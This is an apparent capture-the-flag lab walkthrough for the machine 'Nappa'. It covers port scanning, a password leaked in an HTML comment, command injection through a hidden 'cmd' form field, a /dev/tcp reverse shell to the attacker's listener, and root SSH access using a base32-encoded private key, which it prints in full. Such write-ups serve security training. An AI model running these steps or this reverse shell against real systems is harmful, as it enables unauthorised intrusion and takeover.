# Exploitation Guide for Nappa

## Summary

This machine suffers from several source code information leaks. We  first discover a password that can be reused to gain admin access to the web forum. Next, we discover a commented HTML form code which we can  leverage into command injection. Finally, we discover a base32-encoded  password that lets us escalate directly to `root`.

## Enumeration

### Nmap

We’ll begin with a few `nmap` scans.

```
kali@kali:~$ sudo nmap -p- 192.168.120.202
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 08:27 EST
Nmap scan report for 192.168.120.202
Host is up (0.030s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
3306/tcp  open  mysql
8080/tcp  open  http-proxy
28080/tcp open  unknown
60022/tcp open  unknown
kali@kali:~$ sudo nmap -p 21,3306,8080,28080,60022 -sC -sV 192.168.120.202
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-10 15:23 -03
Nmap scan report for 192.168.120.202
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   14 14       11           4096 Nov 06 19:01 forum
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.118.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, FourOhFourRequest, LANDesk-RC, NULL, NotesRPC, RPCCheck, WMSRequest: 
|_    Host '192.168.118.8' is not allowed to connect to this MariaDB server
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
|_http-title: ForumOnRails
28080/tcp open  http       Apache httpd 2.4.46 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
|_http-title: html5-goku-en-javascript
60022/tcp   open  ssh        OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 76:61:5c:e1:8c:ca:14:e8:7a:63:ba:a3:46:9f:09:b3 (RSA)
|   256 e3:ed:fc:a8:10:d7:8e:b1:7c:de:a2:59:df:19:06:29 (ECDSA)
|_  256 e5:dd:dd:a7:e3:ac:5f:b9:2b:4b:d0:27:e3:3c:c2:43 (ED25519)

2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.88 seconds
```

### CURL

There appears to be an interesting application listening on port `8080`. The forum application lets us register an account and add new posts.  The source code of the registration page reveals several usernames  including the very interesting `admin.forum`:

```
kali@kali:~$ curl http://192.168.120.202:8080/ | html2text 
 ForumOnRails
[                    ]
    * Login
    * Register
    *  All Questions
    *  Popular
    *  Solved
    *  Unsolved
    *  No Replies
===============================================================================
    *  General
    *  Uncategorized
    *  Anime
    *  Manga
===============================================================================
 Is_this_Working?    0
westley.dakari  asked 6 days
 General
 Attack_on_Titan,_Final_Season    0
willam.iran  asked 6 days
 Anime
 Features_Mising    0
willam.iran  asked 6 days
 Uncategorized
 Nausicaa_Manga    0
logun.vergil  asked 6 days
 Manga
 Features_Roadmap    0
admin.forum  asked 6 days
 General
 Can_we_add_a_Games_Category?    0
romaan.juanluis  asked 6 days
 General
===============================================================================
Copyright © Your Website 2019
```

## Exploitation

### Forum Application

The source code of `/register` reveals something quite interesting:

```
kali@kali:~$ curl http://192.168.120.202:8080/register
<!DOCTYPE html>
<html>
  <head>
    <title>ForumOnRails</title>
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="Ll7f1dmaEkV/qZnsNrjKjmRqF7Fz8M5bYJ2hQ1JMyAuXN5x13n3QSw08ctDpRoXmvaSNuo8R5ntOIoShtt4hOA==" />
...
    <div class="form-group">
      <label for="user_email">Email</label><br />
      <input autofocus="autofocus" autocomplete="email" class="form-control" required="required" type="email" value="" name="user[email]" id="user_email" />
    </div>

    <div class="form-group">
      <label for="user_password">Password</label>
      <em>(6 characters minimum)</em>
      <br />
      <input autocomplete="new-password" class="form-control" required="required" type="password" name="user[password]" id="user_password" />
    </div>

    <!-- <input type="password" value="it0jNc6L/r090Q=="> -->

...
```

This cleartext password may be a forgotten bit of old code.

We also find an email (`admin.forum@easysetting.com`) in the forum posts which may be linked to the `admin.forum`. Combining this  with the plaintext password grants us access to this user’s panel which presents a new `Server Status` menu option. This menu item opens a page which displays general system  information including an interesting comment in the source code:

```
<form action="/serverinfo" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="tH/RjX54ZKn92Dla+qXNPH5FDr/NvoRdfv8WH2t+Wukst23WtkkFpA1+c8KKECd7slXJNFXimeAxwShafObxQw==" />
  <!-- 
  <input type="text" name="cmd" readonly="">
  <input type="submit" >
  -->
  <br>
  Mem:<br>               total        used        free      shared  buff/cache   available
Mem:          1.9Gi       275Mi       1.5Gi       0.0Ki       177Mi       1.5Gi
Swap:            0B          0B          0B
<br><br>
  OS: <br>Arch Linux \r (\l)

<br><br>
  PS:<br>     PID TTY          TIME CMD
    300 ?        00:00:06 bundle
    609 ?        00:00:00 ps
<br><br>
  Users:<br> root
<br><br>

</form>
```

Using the code editor in any modern browser, we can directly edit the HTML of the page and remove the comments, which will help us reuse the  authenticity token for a simple test:

![Edit HTML](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_45_image_1_Wgy6gPcm.png)

Leveraging this field, let’s run another quick test. We’ll run  `wireshark` on our Kali Machine, and set it to listen on our VPN interface (i.e: tap0).

Next, we’ll run `ping -c 3 192.168.118.8`, making sure to use our proper IP address. If we receive ICMP requests, the `ping` command was executed properly on the remote machine.

![Wireshark](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_45_image_2_frY3S0Zg.png)

It works! Now, let’s set up a listener on port 21 and send the  command for a reverse shell.

```
sh -i >& /dev/tcp/192.168.118.8/21 0>&1
kali@kali:~$ sudo nc -lvnp 21
listening on [any] 21 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.202] 43786
sh: cannot set terminal process group (300): Inappropriate ioctl for device
sh: no job control in this shell

sh-5.0$ whoami
kathleen
```

## Escalation

### Private Key Discovery

As we consider escalation options, we discover something very out of the ordinary in the user’s **.bashrc** file:

```
sh-5.0$ pwd
/home/kathleen

sh-5.0$ cat .bashrc
#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

...

# alias FUWS2LJNIJCUOSKOEBHVARKOKNJUQICQK ... S2LIK
```

Let’s dump this string into a file so we can play around with it.

```
kali@kali:~$ echo "FUWS2LJNIJCUOSKOEB...LECVCFEBFUKWJNFUWS" > base.file
```

When we try to decrypt this file using base64, it produces binary  output. However, decrypting with base32 reveals an OpenSSH private key!

```
kali@kali:~$ cat base.file | base32 -d 
-----BEGIN OPENSSH PRIVATE KEY-----
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
HzfKMk8Wg27VkAAAAKcm9vdEBuYXBwYQE=
-----END OPENSSH PRIVATE KEY-----
```

Since we have only discovered two users on this machine (`kathleen` and the default `root`) we can venture a guess that this key may grant root-level SSH access.

```
kali@kali:~$ cat base.file | base32 -d > key.test

kali@kali:~$ chmod 600 key.test 

kali@kali:~$ ssh -p 60022 root@192.168.120.202 -i key.test 
Last login: Tue Nov 10 18:51:59 2020 from 192.168.118.8

[root@nappa ~]# whoami
root
```

This works and grants us root-level access!